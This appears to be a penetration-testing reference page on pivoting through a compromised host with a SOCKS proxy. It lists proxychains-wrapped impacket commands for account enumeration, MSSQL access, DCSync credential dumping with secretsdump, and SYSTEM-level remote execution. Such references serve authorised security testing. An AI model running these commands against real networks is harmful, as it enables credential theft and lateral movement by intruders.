# Pivoting with Socks

When the next host is not directly reachable, a SOCKS proxy through a compromised machine lets your existing tooling reach it. proxychains in front of the impacket suite is the standard arrangement.

## Why It Works

Network segmentation blocks direct access but rarely blocks an already-compromised host from reaching its neighbours. Tunnelling through that host inherits its network position.

## Prerequisites

* A compromised host that can reach the target segment
* A SOCKS-capable implant or tunnel on that host

## Execution

**Socks (relay)**

* `proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
* `proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
  * **→ MSSQL**
* `proxychains secretsdump.py -no-pass '<domain>'/'<user>'@'<ip>'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
  * **→ DCSYNC**
* `proxychains smbclient.py -no-pass <user>@<ip>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/smbclient.py)
  * **→ Search files**
* `proxychains atexec.py -no-pass <domain>/<user>@<ip> "command"` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
  * **→ Authority/System**
* `proxychains smbexec.py -no-pass <domain>/<user>@<ip>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)
  * **→ Authority/System**

## Related

* [Remote Execution](file:///9685693/lateral-movement/remote-execution.md) — the tools you tunnel
* [Pass-the-Hash & OverPass-the-Hash](file:///9685693/lateral-movement/pass-the-hash.md) — authentication that travels through the tunnel
